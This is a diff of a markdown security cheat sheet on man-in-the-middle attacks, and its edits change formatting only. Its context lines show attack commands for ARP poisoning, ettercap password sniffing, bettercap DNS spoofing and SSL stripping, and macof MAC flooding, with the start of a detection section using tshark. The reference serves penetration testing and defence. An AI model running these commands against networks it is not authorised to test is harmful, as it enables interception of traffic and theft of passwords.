@@ -22,7 +22,7 @@ sysctl -w net.ipv4.ip_forward=1
 
 ## 🔴 Exploit
 
-:::code-group
+::: code-group
 
 ```bash [arpspoof]
 # apt install dsniff
@@ -31,9 +31,9 @@ arpspoof -t 192.168.1.3 192.168.1.2
 ```
 
 ```bash [ettercap]
-ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -i $interface
+ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -i $INTERFACE
 
-sudo ettercap -T -P password_sniffer -i $interface # Password sniffing
+sudo ettercap -T -P password_sniffer -i $INTERFACE # Password sniffing
 ```
 
 ```bash [bettercap]
@@ -46,7 +46,7 @@ sudo bettercap -iface eth0 -caplet mitm.cap
 
 Redirects the victim's DNS queries to an attacker-controlled IP. Usually combined with a web server (Apache/Nginx) to serve the fraudulent page.
 
-:::code-group
+::: code-group
 
 ```bash [bettercap]
 # Configuration
@@ -71,7 +71,7 @@ ettercap -T -P dns_spoof -M arp:remote /192.168.1.2// /192.168.1.3//
 
 Downgrades HTTPS connections to plaintext HTTP. **Does not work against HSTS**.
 
-:::code-group
+::: code-group
 
 ```bash [bettercap]
 # Enable SSL stripping in the HTTP proxy
@@ -99,7 +99,7 @@ ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -F sslstrip.filter
 
 IPv6 equivalent of ARP Spoofing. Sends forged Neighbor Advertisement packets to poison the Neighbor Cache of targets. Required when the network uses IPv6, since classic ARP Spoofing does not apply.
 
-:::code-group
+::: code-group
 
 ```bash [bettercap]
 # Configuration
@@ -130,7 +130,7 @@ Saturates the switch MAC table to force it into "hub mode" (broadcasting all tra
 
 ```bash
 # apt install dsniff
-macof -i $interface
+macof -i $INTERFACE
 ```
 
 ## 🔵 Detection
@@ -174,8 +174,8 @@ sudo tshark -i eth0 -Y "arp.opcode == 2" -T fields \
 
 - [bettercap.org](https://www.bettercap.org/)
 
-```bash [bettercap]
-bettercap -iface $interface -caplet config.cap
+```bash
+bettercap -iface $INTERFACE -caplet config.cap
 ```
 
 ::: details `bettercap config` (mitm.cap)
